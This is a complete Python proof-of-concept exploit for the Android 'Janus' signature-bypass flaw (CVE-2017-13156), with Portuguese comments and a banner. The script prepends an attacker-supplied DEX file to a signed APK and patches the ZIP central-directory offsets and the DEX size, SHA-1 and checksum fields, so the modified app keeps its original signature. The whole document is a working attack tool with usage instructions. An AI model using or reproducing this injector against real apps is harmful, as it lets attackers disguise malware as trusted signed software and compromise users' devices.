#!/usr/bin/env python3
'''
PoC para (CVE-2017–13156)
Exemplo de uso >> python rosa.py classes.dex base.apk pocjanus.apk
'''

import sys
import struct
import hashlib
import argparse
from zlib import adler32

def exibir_banner():
   
    rosa = "\033[95m"
    reset = "\033[0m"  
    print("\n")
    print(rosa + "  ***************************************  " + reset)
    print(rosa + "  *           ROSA DEX Injetor          *  " + reset)
    print(rosa + "  *                beniwh               *  " + reset)
    print(rosa + "  ***************************************  " + reset)
    print(rosa + "       _.-- ,.--.                          " + reset)
    print(rosa + "     .'..   .'   /                         " + reset)
    print(rosa + "     |.. @       |'..--------.___          " + reset)
    print(rosa + "    /..      \\._/                '._      " + reset)
    print(rosa + "   /..  .-.-..                       \     " + reset)
    print(rosa + "  (..  /    \\..                       \   " + reset)
    print(rosa + "   \.. \      '...                    |\  " + reset)
    print(rosa + "    \.. \       \\..   -..            /  #" + reset)
    print(rosa + "     \.. \        |..  ).._________   \\   " + reset)
    print(rosa + "      \../        |.. /..\   |..  \\    )  " + reset)
    print(rosa + "                  |.. |../   :___| \\.-'   " + reset)
    print(rosa + "                  '---'                    " + reset)
    print("--------------------------------------------------")
    
def atualizar_checksum(apk_data):
    """
    Atualiza o checksum do APK.

    Args:
    apk_data (bytearray): Dados do APK a serem modificados.
    """
    sha1_hash = hashlib.sha1()
    sha1_hash.update(apk_data[32:])
    apk_data[12:32] = sha1_hash.digest()

    checksum = adler32(apk_data[12:]) & 0xffffffff
    apk_data[8:12] = struct.pack("<L", checksum)

def analisar_argumentos():
    """
    Analisa os argumentos da linha de comando.

    Returns:
    Tuple: Argumentos da linha de comando (dex, apk, out_apk).
    """
    parser = argparse.ArgumentParser(description="Injeta um arquivo DEX em um APK.")
    parser.add_argument("dex", help="Caminho do arquivo DEX")
    parser.add_argument("apk", help="Caminho do arquivo APK original")
    parser.add_argument("out_apk", help="Caminho do APK de saída")
    args = parser.parse_args()
    return args.dex, args.apk, args.out_apk

def main():
    exibir_banner()

    dex_path, apk_path, out_apk_path = analisar_argumentos()

    try:
        with open(dex_path, 'rb') as file:
            dex_data = bytearray(file.read())
        dex_size = len(dex_data)

        with open(apk_path, 'rb') as file:
            apk_data = bytearray(file.read())

        cd_end_addr = apk_data.rfind(b'\x50\x4b\x05\x06')
        cd_start_addr, = struct.unpack("<L", apk_data[cd_end_addr+16:cd_end_addr+20])
        apk_data[cd_end_addr+16:cd_end_addr+20] = struct.pack("<L", cd_start_addr + dex_size)

        pos = cd_start_addr
        while pos < cd_end_addr:
            offset, = struct.unpack("<L", apk_data[pos+42:pos+46])
            apk_data[pos+42:pos+46] = struct.pack("<L", offset + dex_size)
            pos = apk_data.find(b"\x50\x4b\x01\x02", pos + 46, cd_end_addr)
            if pos == -1:
                break

        out_data = dex_data + apk_data
        out_data[32:36] = struct.pack("<L", len(out_data))
        atualizar_checksum(out_data)

        with open(out_apk_path, "wb") as file:
            file.write(out_data)

        print(f'    {out_apk_path} - - - - OK')

    except IOError as e:
        print(f'    ERRO: {e}')
        sys.exit(1)

if __name__ == '__main__':
    main()
